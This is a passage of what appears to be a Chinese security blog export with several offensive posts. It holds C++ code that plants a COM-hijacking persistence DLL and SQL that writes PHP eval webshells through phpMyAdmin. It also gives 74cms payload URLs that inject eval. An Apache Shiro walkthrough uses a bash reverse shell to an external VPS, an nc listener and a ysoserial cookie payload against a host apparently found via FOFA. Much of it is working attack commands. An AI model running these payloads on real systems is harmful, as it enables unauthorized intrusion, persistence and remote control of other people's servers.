0, REG_SZ, (BYTE*)system1, (1 + ::lstrlenA(system1))))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;设置DLL文件失败！&quot;);</span><br><span class="line">				return 0;</span><br><span class="line">			&#125;</span><br><span class="line">			if (ERROR_SUCCESS !&#x3D; RegSetValueExA(hKey, &quot;ThreadingModel&quot;, 0, REG_SZ, (BYTE*)system2, (1 + ::lstrlenA(system2))))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;设置ThreadingModel失败！&quot;);</span><br><span class="line">				return 0;</span><br><span class="line">			&#125;</span><br><span class="line">			::MessageBoxA(NULL, &quot;comHijacking OK!&quot;, &quot;OK&quot;, MB_OK);</span><br><span class="line">		&#125;</span><br><span class="line">		if (&quot;-down&quot; &#x3D;&#x3D; type)</span><br><span class="line">		&#123;</span><br><span class="line">			if (ERROR_SUCCESS !&#x3D; RegCreateKeyExA(HKEY_CURRENT_USER,</span><br><span class="line">				&quot;Software\\Classes\\CLSID\\&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\\InprocServer32&quot;, 0, NULL, 0, KEY_WRITE, NULL, &amp;hKey, &amp;dwDisposition))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;创建注册表失败！&quot;);</span><br><span class="line">				return 0;</span><br><span class="line">			&#125;</span><br><span class="line">			if (ERROR_SUCCESS !&#x3D; RegDeleteValueA(hKey, NULL))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;移除DLL文件失败！&quot;);</span><br><span class="line">				return 0;</span><br><span class="line">			&#125;</span><br><span class="line">			if (ERROR_SUCCESS !&#x3D; RegDeleteValueA(hKey, &quot;ThreadingModel&quot;))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;移除ThreadingModel失败！&quot;);</span><br><span class="line">				return 0;</span><br><span class="line">			&#125;</span><br><span class="line">			remove(szSaveName.c_str());</span><br><span class="line">			remove(defaultPath.c_str());</span><br><span class="line">			::MessageBoxA(NULL, &quot;Delete comHijacking OK!&quot;, &quot;OK&quot;, MB_OK);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;system(&quot;pause&quot;);</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;Usage:\n	comHijacking.exe -go 进行COM劫持\n	comHijacking.exe -down 移除COM劫持&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别问我为什么不写在两个函数里，因为我不会。</p><p>DLL文件代码（这里的DLL代码就是用的上次的那个DLL文件）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">	MessageBoxA(0, &quot;hello qianxiao996&quot;, &quot;AppCert&quot;, 0);</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行效果图"><a href="#运行效果图" class="headerlink" title="运行效果图"></a>运行效果图</h2><p>运行生成的EXE文件（管理员运行），注意-go是安装劫持，-down是移除劫持.</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/1-2.png"><img src="1-2.png" alt="img"></a></p><p>运行后，会生成以下目录：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Installer\\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span><br></pre></td></tr></table></figure><p>然后将自己写好的DLL文件放入当前目录中</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/2-3.png"><img src="2-3.png" alt="img"></a></p><p>会生成以下注册表项</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/3-2.png"><img src="3-2.png" alt="img"></a></p><p>运行计算器，调用qianxiao996.dll 弹出对话框：</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/4.png"><img src="4.png" alt="img"></a></p><p>移除COM劫持</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/5.png"><img src="5.png" alt="img"></a></p><h2 id="检查及清除方法"><a href="#检查及清除方法" class="headerlink" title="检查及清除方法"></a>检查及清除方法</h2><p>由于COM对象是操作系统和已安装软件的合法部分，因此直接阻止对COM对象的更改可能会对正常的功能产生副作用。相比之下，使用白名单识别潜在的病毒会更有效。</p><p>现有COM对象的注册表项可能很少发生更改。当具有已知路径和二进制的条目被替换或更改为异常值以指向新位置中的未知二进制时，它可能是可疑的行为，应该进行调查。同样，如果收集和分析程序DLL加载，任何与COM对象注册表修改相关的异常DLL加载都可能表明已执行COM劫持。</p><p>此文章修改于天融信阿尔法实验室 ATT&amp;CK之后门持久化（一）COM组件劫持</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
  </entry>
  <entry>
    <title>PhpMyadmin后台拿webshell方法总结</title>
    <url>/2019/09/05/PhpMyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFwebshell%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:17:24 GMT+0800 (GMT+08:00) --><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>phpmyadmin后台拿webshell的方法主要分为两个方法：</p><p>(1) 、通过日志文件拿webshell;</p><p>(2) 、利用日志文件写入一句话;(这个方法可能在实际操作中会遇到困难)；</p><h1 id="本地搭建环境："><a href="#本地搭建环境：" class="headerlink" title="本地搭建环境："></a>本地搭建环境：</h1><p>Phpmystudy 2018</p><p>PHP–5.5.38</p><h2 id="一、日志文件写入一句话来获取webshell："><a href="#一、日志文件写入一句话来获取webshell：" class="headerlink" title="一、日志文件写入一句话来获取webshell："></a>一、日志文件写入一句话来获取webshell：</h2><p>(1) 、首先我们先利用日志文件写入一句话来获取webshell，日志文件写入的思路利用mysql的一个日志文件。我们执行的每一个sql语句都会被保存到日志中，换个思路想一下把这个日志文件重名为<em>.php,然后我们在执行一次sql语句，那么就会被保存在这个</em>.php文件中，这样我们就能顺利拿到webshell。</p><p>(2) 、假如通过某个方法获取到phpmyadmin的登陆后台且账号密码是弱口令：</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/2.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/2.png" alt="img"></a></p><p>（3）、点击变量选项，搜索gen就会出来general.log和general log file这两个变量，general.log变量是指是否启动记录日志；而general log file指的是日志文件的路径，可以看到general.log变量的状态为OFF，故我们要修改为ON；general log file变量中的<em>.log的后缀我们改为</em>php。拿完webshell记得要改回去哟。</p><p>SQL语句进行修改：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET global general_log &#x3D; &quot;ON&quot;; 日志保存状态开启；</span><br><span class="line">SET global general_log_file&#x3D;&#39;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;shell.php&#39;; 修改日志的保存位置。</span><br></pre></td></tr></table></figure><p>（具体路径还需在实际环境中改变）；</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/3.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/3.png" alt="img"></a></p><p>修改后的配置</p><p>（4）保存后，我们在SQL查询的框中写入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;;</span><br><span class="line">或着 </span><br><span class="line">SELECT &#39;&lt;?phpassert($_POST[&quot;cmd&quot;]);?&gt;&#39;;</span><br></pre></td></tr></table></figure><p>执行完毕后就会出现这个界面，这样的话我们就成功的把一句话写入到日志文件中：</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/5.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/5.png" alt="img"></a></p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/6.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/6.png" alt="img"></a></p><p>（5）、查看网站目录下生成了一个shell.php的文件，一句话木马已经被我们写入，看到这里大家可能会问为什么里面不是纯净的一句话木马？我也百思不得其解，百度了一下发现是我们是上传的php一句话木马，在连接过程中，它是从头开始读取的，因为前面的不具备php文件的特征：</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/7.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/7.png" alt="img"></a></p><p>（6）、浏览器测试</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/8.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/8.png" alt="img"></a></p><p>用菜刀直接连接木马地址，webshell成功拿到：</p><p><a href="http://127.0.0.1/shell.php" target="_blank" rel="noopener">http://127.0.0.1/shell.php</a></p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/9.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/9.png" alt="img"></a></p><p>webshell已经拿到</p><h2 id="二、利用插入一句话来提取webshell"><a href="#二、利用插入一句话来提取webshell" class="headerlink" title="二、利用插入一句话来提取webshell:"></a>二、利用插入一句话来提取webshell:</h2><p>1、在知道路径的前提下插入一句话，</p><p>我们在插入一句话木马的时候首先要检测插入的条件是否被允许，输入查询语句</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure><p>显示是NULL值，这样的情况下我们插入一句话是无法插入的，需要我们修改secure_file_priv=’’为空值才能插入一句话：</p><p>解释一下：</p><ul><li>secure_file_priv为null 表示不允许导入导出；</li><li>secure_file_priv指定文件夹时，表示mysql的导入导出只能在指定的文件夹；</li><li>secure_file_priv没有设置时，则表示没有任何限制；</li></ul><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/10.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/10.png" alt="img"></a></p><p>当secure_file_priv为null 时，执行插入语句，发现无法插入一句话木马：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;INTO OUTFILE &#39;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;shell.php&#39;;</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/11.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/11.png" alt="img"></a></p><p>意思是Mysql服务器运行“–secure-file-priv”选项，所以不能执行这个语句。</p><p>如果要解决这个问题，我们可以通过下面2种方式：将你要导入或导出的文件位置指定到你设置的路径里；由于不能在网页上修改，所以我们只能修改my.cnf里关于这个选项的配置，然后重启即可。（windwos下my.cnf叫my.ini）我的在E:\phpStudy\PHPTutorial\MySQL路径下</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/12.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/12.png" alt="img"></a></p><p>把–secure-file-priv修改为’’ 没有这个则添加。</p><p>（1）、当我们把上面的障碍扫平之后，接下来就比较简单，我们可以这样写：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;INTO OUTFILE &#39;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;shell.php&#39;;</span><br></pre></td></tr></table></figure><p>意思就是在目录下会生成一个shell.php的文件，我们用菜刀直接连接这个文件地址就可以直接拿到webshell：</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/13.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/13.png" alt="img"></a></p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/14.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/14.png" alt="img"></a></p><p>（2）、我们用菜刀直接连接<a href="http://127.0.0.1/shell.php就可以成功拿到服务器webshell：" target="_blank" rel="noopener">http://127.0.0.1/shell.php就可以成功拿到服务器webshell：</a></p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/15.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/15.png" alt="img"></a></p><p>2、在不知道绝对路径的前提下拿webshell：</p><p>这个方法几乎和我们做灰盒测试差不多，只拿到了登陆后台，但是不知道网站的绝对路径，这就非常尴尬，下面我总结了一下几点可以成功爆出网站的根路径：</p><p>（1）、SQL查询框中输入select @@basedir;就可以成功的输出绝对路径，这是利用了mysql的特性；（这个比较常用，毕竟是mysql的特性）</p><p>select @@basedir;</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/16.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/16.png" alt="img"></a></p><p>（2）、直接在url后面输入phpinfo.php,看看能不能读出这个文件，如果存在就会把网站的绝对路径显示出来，这样的情况特少，因为网站管理人员不可能把这个测试页面在互联网上面直接显示出来，他们或许会更改路径或许会设置目录访问权限；</p><p>（3）、使用扫描工具对网站进行扫扫描；扫描一些phpinfo.php info.php php.php test.php等等；</p><p>（4）、phpmyadmin读取 iis6，iis7配置文件 读取apache Nginx 配置文件！</p><ul><li>windows2003 iis6配置文件所在位置 C:\Windows/system32\inetsrv\metabase.xml</li><li>win2008/2012 iis7.5 在这个文件 C:\Windows\System32\inetsrv\config\applicationHost.config</li><li>Nginx配置 /etc/nginx/conf.d/vhost.conf /etc/nginx/nginx.conf</li><li>apache配置 /etc/httpd/conf/httpd.conf /usr/local/apache2/conf/httpd.conf</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="1、利用日志写shell"><a href="#1、利用日志写shell" class="headerlink" title="1、利用日志写shell"></a>1、利用日志写shell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET global general_log &#x3D; &quot;ON&quot;; 日志保存状态开启；</span><br><span class="line">SET global general_log_file&#x3D;&#39;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;shell.php&#39;; 修改日志保存的位置</span><br><span class="line">SELECT &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;;</span><br></pre></td></tr></table></figure><h2 id="2、利用-select-XXX-into-outfile-绝对路径写shell（需要secure-file-priv-’’）"><a href="#2、利用-select-XXX-into-outfile-绝对路径写shell（需要secure-file-priv-’’）" class="headerlink" title="2、利用 select XXX into outfile 绝对路径写shell（需要secure_file_priv=’’）"></a>2、利用 select XXX into outfile 绝对路径写shell（需要secure_file_priv=’’）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;INTO OUTFILE &#39;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;shell.php&#39;;</span><br></pre></td></tr></table></figure><h2 id="3、查找绝对路径"><a href="#3、查找绝对路径" class="headerlink" title="3、查找绝对路径"></a>3、查找绝对路径</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@basedir;</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透技巧</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
      </tags>
  </entry>
  <entry>
    <title>74cms v4.2.1-v4.2.129-后台getshell漏洞复现</title>
    <url>/2019/12/09/74cms-v4-2-1-v4-2-129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:51:23 GMT+0800 (GMT+08:00) --><h1 id="0x00-影响范围"><a href="#0x00-影响范围" class="headerlink" title="0x00 影响范围"></a><strong>0x00 影响范围</strong></h1><p>v4.2.1-v4.2.129</p><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a><strong>0x01 环境搭建</strong></h1><p>\1. 先去官网下载 骑士人才系统基础版(安装包)</p><p>2.将下载好的包进行安装</p><p><img src="1575872895783056.png" alt="1.png"></p><h1 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a><strong>0x02 复现过程</strong></h1><p>当前版本v4.2.111</p><p><img src="1575873452113404.png" alt="2.png"></p><p>点加工具，点击风格模板</p><p><img src="1575873057672321.png" alt="3.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Payload：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;74cms&#x2F;index.php?m&#x3D;admin&amp;c&#x3D;tpl&amp;a&#x3D;set&amp;tpl_dir&#x3D;&#39;,&#39;a&#39;,phpinfo(),&#39;</span><br><span class="line"></span><br><span class="line">shell地址：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;74cms&#x2F;Application&#x2F;Home&#x2F;Conf&#x2F;config.php</span><br></pre></td></tr></table></figure><p>直接访问</p><p><img src="1575873166747914.png" alt="5.png"></p><p>后端代码</p><p><img src="1575872777895617.png" alt="1575872777895617.png"></p><p>GETSHELL</p><p><a href="http://127.0.0.1/74cms/index.php?m=admin&amp;c=tpl&amp;a=set&amp;tpl_dir=&#39;,&#39;a&#39;,eval($_GET[1]),&#39;" target="_blank" rel="noopener">http://127.0.0.1/74cms/index.php?m=admin&amp;c=tpl&amp;a=set&amp;tpl_dir=&#39;,&#39;a&#39;,eval($_GET[1]),&#39;</a></p><p><img src="1575872777204019.png" alt="1575872777204019.png"></p><p>后端代码</p><p><img src="1575872777494094.png" alt="1575872777494094.png"></p><p><a href="http://127.0.0.1/74cms/Application/Home/Conf/config.php?1=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/74cms/Application/Home/Conf/config.php?1=phpinfo()</a>;</p><p><img src="1575872777724008.png" alt="1575872777724008.png">)<img src="1575872777830410.png" alt="1575872777830410.png"></p><h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a><strong>0x03 漏洞分析</strong></h1><p>请移步<a href="http://www.xinziyou123.com/新版74cms-v4-2-1-v4-2-129-后台getshell漏洞/" target="_blank" rel="noopener">http://www.xinziyou123.com/%e6%96%b0%e7%89%8874cms-v4-2-1-v4-2-129-%e5%90%8e%e5%8f%b0getshell%e6%bc%8f%e6%b4%9e/</a></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Shiro反序列化远程代码执行漏洞复现</title>
    <url>/2020/04/09/Apache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:51:23 GMT+0800 (GMT+08:00) --><p>玄魂工作室大佬的文章</p><p><a href="https://mp.weixin.qq.com/s/8F5tmbJsE0SshrYK-fRl-g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/8F5tmbJsE0SshrYK-fRl-g</a></p><p>首先FOFA找一个环境，检测工具检测一下</p><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Cclipboard.png" alt="img"></p><p>发现目标，开干!</p><h1 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h1><p>首先在vps运行nc 监听一个端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 666</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5C2-300x54.png" alt="img"></p><h1 id="列出需要使用的反弹指令"><a href="#列出需要使用的反弹指令" class="headerlink" title="列出需要使用的反弹指令"></a>列出需要使用的反弹指令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;129.204.xxx.xxx&#x2F;666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>将指令放到<a href="http://www.jackson-t.ca/runtime-exec-payloads.html转换成加密后的指令" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html转换成加密后的指令</a></p><p>将指令合成为一个java的监听指令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;加密后的指令&#39;</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaxxxxxxxxxxxxxxxxxxxxxxxxxxxxkuMjA0LjExMy4yMDIvNjY2IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure><p>运行以下指令开启java一个监听端口</p><p>嗯。。。出错了</p><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5C1584938854895_3fe02dfc-b239-4d7b-9d60-11916e9f73fc.png" alt="img"></p><p>难受，我又重新安装了mvn，然后打包的ysoserial.jar</p><p>mvn安装：<a href="https://jingyan.baidu.com/article/d2b1d102b9dd855c7e37d486.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/d2b1d102b9dd855c7e37d486.html</a></p><p>打包命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5C4-300x144.png" alt="img"></p><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5C2-300x543.png" alt="img">)<img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5C5-300x122252.png" alt="img"></p><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5C6-300x149.png" alt="img"></p><p>还是出错！</p><p>最后才知道因为jdk版本的问题，只能用1.8</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装jdk1.8</span><br><span class="line">apt-get install oracle-java8-installer</span><br><span class="line">选择jdk版本</span><br><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5C7-300x68.png" alt="img"></p><p>然后再运行就好了</p><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5C33.jpg" alt="img"></p><h1 id="利用poc生成cookie"><a href="#利用poc生成cookie" class="headerlink" title="利用poc生成cookie"></a>利用poc生成cookie</h1><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Ccl33ipboard.png" alt="img"></p><p>我不是一个合格的网安人员。。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 -m pip install pycryptodome</span><br></pre></td></tr></table></figure><p>安装这个库就可以了。</p><p>然后进入这个库的目录：Lib\site-packages</p><p>找到 crypto 这个库，更改为首字母大写 Crypto 即可</p><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Cclipbo33ard.png" alt="img"></p><p>得到cookie</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rememberMe&#x3D;3Wb6O2eQTCeimDMS1uEUQANKouApX2EvmE7yZfXgnZWN+pxrZ4jH+CTcjRPRyuMXFt1NbRzH+IZhT7yoiK87ptD2HcSqqGKw50bEeDWdKPV7UDix82FQx5SQpYpVipyXk6LNO&#x2F;BMFtMzvEsdjB6b9hMsHqz8&#x2F;WVPWtT6V3J1Iq8oXm1MBfLSe7y8zd4BtM1vru+FyUSVdkw5Bv2pkB7o0LrUkhtbM58PVlxFgMBtU2nE0fvClfeX5ay0WINJjeGC8KQzMP0SFsWnnAwcJG513sPd796ppfEI8+esJ57yfRpiPXmlz9ZFMx66tvsVU9Enq1dCXOLNQPWkz+uLf5VDOO80nV6R0f+7+EXY&#x2F;egY7w+hWNKJwDngKXvuyINGhhOVOrEzneSfCtvD8tOadPcU7A&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>抓包进行发送</p><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5C333.jpg" alt="img">)<img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5C11-300xwww116.png" alt="img"></p><p>弹回来了。</p><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Cclip333board.png" alt="img"></p><p><img src="D:%5Cblog%5Csource_posts%5CApache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Cclipboaaaard.png" alt="img"></p><p>机器到手，溜了溜了。。。</p><h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><h2 id="crontab从文件导入和导出到文件"><a href="#crontab从文件导入和导出到文件" class="headerlink" title="crontab从文件导入和导出到文件"></a>crontab从文件导入和导出到文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#导入 </span><br><span class="line">[root@localhost ~]# crontab filename </span><br><span class="line">#导出 </span><br><span class="line">[root@localhost ~]# crontab -l &gt;filename</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>CVE漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF--这好像不是文件上传</title>
    <url>/2019/10/29/CTF-%E8%BF%99%E5%A5%BD%E5%83%8F%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
